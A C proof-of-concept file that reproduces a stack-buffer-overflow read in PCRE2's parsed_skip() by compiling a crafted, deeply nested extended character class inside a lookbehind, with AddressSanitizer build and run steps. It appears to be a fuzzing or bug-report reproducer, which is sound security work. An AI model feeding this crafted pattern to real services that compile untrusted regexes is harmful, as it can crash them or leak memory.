/* PoC for a stack-buffer-overflow read in parsed_skip() (pcre2_compile.c),
 * reached via the public pcre2_compile_8() API while compiling a pattern
 * that uses PCRE2_ALT_EXTENDED_CLASS with a fixed-length, deeply-nested
 * extended character class inside a lookbehind assertion.
 *
 * Build (static link against the patched library):
 *   cc -fsanitize=address -g -O1 -I/work/build/interface \
 *      /work/pocs/newbug.c /work/build/libpcre2-8.a -o /tmp/newbug
 *
 * Run:
 *   ASAN_OPTIONS=abort_on_error=1:exitcode=134 /tmp/newbug
 */

#define PCRE2_CODE_UNIT_WIDTH 8
#include <pcre2.h>
#include <stdio.h>

int main(void)
{
PCRE2_SIZE erroroffset;
int errorcode;

static const unsigned char pattern[] =
  "(?<=[a&&[b1&&[b2&&[b3&&[b4&&[b5]&&p5]&&p4]&&p3]&&p2]&&p1])X[xy]";

pcre2_code *re = pcre2_compile(pattern, PCRE2_ZERO_TERMINATED,
  PCRE2_ALT_EXTENDED_CLASS, &errorcode, &erroroffset, NULL);

if (re == NULL)
  {
  unsigned char buf[256];
  pcre2_get_error_message(errorcode, buf, sizeof(buf));
  printf("Compilation failed at offset %lu: %s\n",
    (unsigned long)erroroffset, buf);
  return 1;
  }

printf("Compiled OK (unexpected)\n");
pcre2_code_free(re);
return 0;
}
